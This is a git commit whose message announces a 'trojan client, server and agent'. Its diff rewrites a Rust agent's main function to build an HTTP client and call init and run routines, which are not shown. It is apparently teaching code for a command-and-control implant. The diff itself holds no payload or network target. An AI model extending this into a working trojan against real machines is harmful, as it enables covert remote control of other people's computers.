ff293cb394fb89caecc39a618cd180f5ecfb2983
Vinicius Santos <vinicius.santanasantos@yahoo.com.br>
2023-11-23 23:03:01 -0300

    Add trojan client, server and agent

--- agent/src/main.rs
+++ agent/src/main.rs
@@ -1,3 +1,18 @@
-fn main() {
-    println!("Hello, world!");
+use std::time::Duration;
+
+mod config;
+mod error;
+mod init;
+mod run;
+
+pub use error::Error;
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let api_client = ureq::AgentBuilder::new()
+        .timeout(Duration::from_secs(10))
+        .user_agent("ch_11_agent/0.1")
+        .build();
+
+    let conf = init::init(&api_client)?;
+    run::run(&api_client, conf);
 }
